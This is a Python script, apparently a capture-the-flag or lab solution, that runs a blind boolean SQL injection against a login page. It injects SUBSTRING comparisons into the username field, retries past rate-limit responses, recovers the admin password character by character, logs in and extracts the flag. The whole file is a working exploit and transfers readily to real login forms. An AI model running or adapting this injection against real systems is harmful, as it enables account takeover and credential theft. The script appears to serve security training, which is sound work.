import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

import string

URL = "https://login.quoccacorp.com/v5"

class Solver:
    def __init__(self):
        self.session = get_session()

    def has_error(self, response):
        ERRORS = [
            "Incorrect username or password"
        ]
        return any(error in response.text for error in ERRORS)

    def execute_payload(self, position: int, char: str):
        while True:
            payload = f"admin' AND SUBSTRING(password, {position}, 1) = '{char}'; -- "
            response = self.session.post(URL, data={"username": payload})
            if response.status_code != 429:
                return response

    def main(self):
        PASSWORD_LEN = 20
        PASSWORD_VALID_CHARS = '-' + string.ascii_letters + string.digits
        password = ''

        for position in range(1, PASSWORD_LEN + 1):
            for char in PASSWORD_VALID_CHARS:
                response = self.execute_payload(position, char)
                if not self.has_error(response):
                    print(f"⚙️ Found char at pos {position}: {char}")
                    password += char
                    break

        print(f"✅ Found password: {password}")

        response = self.session.post(URL, data={"username": "admin", "password": password})
        find_flag(response.text)

if __name__ == "__main__":
    Solver().main()